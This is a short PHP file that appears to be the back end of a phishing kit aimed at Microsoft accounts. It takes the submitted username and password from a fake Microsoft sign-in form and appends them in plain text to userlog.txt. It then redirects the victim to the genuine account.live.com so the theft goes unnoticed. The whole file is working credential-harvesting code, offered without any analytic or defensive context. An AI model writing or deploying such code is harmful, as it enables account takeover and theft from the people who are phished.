<?php

file_put_contents("userlog.txt", "Microsoft Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://account.live.com');
exit();